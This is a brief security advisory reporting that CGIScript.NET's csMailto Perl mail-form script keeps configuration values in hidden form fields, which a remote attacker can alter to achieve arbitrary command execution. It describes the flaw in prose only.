CGIScript.NET csMailto is a Perl script designed to support multiple mailto: forms. A vulnerability has been reported in some versions of this script.

Reportedly, configuration values used by the script are contained in hidden form values. As a result, a remote attacker may trivially modify these values between script invocations. Consequences include arbitrary command execution on the vulnerable system.
